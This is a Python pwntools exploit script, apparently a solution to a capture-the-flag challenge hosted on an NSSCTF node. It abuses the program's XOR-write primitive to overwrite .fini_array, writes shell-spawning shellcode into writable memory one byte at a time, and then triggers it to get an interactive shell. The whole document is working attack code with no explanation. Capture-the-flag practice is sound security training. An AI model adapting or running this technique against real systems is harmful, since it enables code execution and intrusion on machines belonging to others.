from pwn import *
context(log_level='debug',arch='amd64',terminal=['tmux','splitw','-h'])

# io=process("./pwn")
io=remote("node4.anna.nssctf.cn",28981)
libc=ELF("./libc.so.6")

def xorenc(addr,val):
    io.sendlineafter(b"addr: ",addr)
    io.sendlineafter(b"value: ",val)    

# gdb.attach(io)
# pause()

pop_rdi=0x2a3e5 
flag=0x600bcc
fini_array=0x600970
sc_addr=0x600d00  # xor 0x400610  20 0B10

xorenc(hex(flag+3).encode(),b"0xff")
xorenc(hex(fini_array).encode(),b"0x10")
xorenc(hex(fini_array+1).encode(),b"0x0b")
xorenc(hex(fini_array+2).encode(),b"0x20")

shellcode=asm(shellcraft.sh())
for i in range(len(shellcode)):
    xorenc(hex(sc_addr+i),hex(shellcode[i]).encode())

xorenc(hex(flag+3).encode(),b"0xff") #trigger

io.interactive()